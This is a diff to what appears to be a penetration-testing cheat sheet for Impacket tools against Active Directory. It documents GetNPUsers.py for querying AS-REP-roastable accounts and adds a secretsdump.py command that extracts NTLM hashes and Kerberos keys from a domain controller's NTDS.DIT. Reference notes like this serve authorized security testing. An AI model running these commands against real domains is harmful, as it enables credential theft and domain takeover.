@@ -3,11 +3,11 @@ Usage:
 Options:
 Informational:
 
-########### ASREPRoasting ###########
-GetNPUsers.py tool allows to query ASReproastable accounts from the Key Distribution Center
+########### GetNPUsers.py ###########
+GetNPUsers.py allows to query ASReproastable accounts from the Key Distribution Center
 
 Usage:
-  python GetNPUsers.py -no-pass -usersfile <USERS_TXT> -dc-ip <TARGET_IP> <DOMAIN>.local/
+  GetNPUsers.py -no-pass -usersfile <USERS_TXT> -dc-ip <TARGET_IP> <DOMAIN>.local/
                              Query ASReproastable accounts from the Key Distribution Center
                              Needed valid set of usernames
 Options:
@@ -26,7 +26,20 @@ Informational:
   Ticket on the specified user account.
 
 
-########### ASREPRoasting ###########
+########### secretsdump.py ###########
+secretsdump.py allows to retrieve all of the password hashes that this user account 
+(that is synced with the domain controller) has to offer
+
+Usage:
+  secretsdump.py -just-dc <ACCOUNT_NAME>@<TARGET_IP>
+
+Options:
+  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos
+                        keys)
+
+Informational:
+  
+
 ########### ASREPRoasting ###########
 ########### ASREPRoasting ###########
 ########### ASREPRoasting ###########
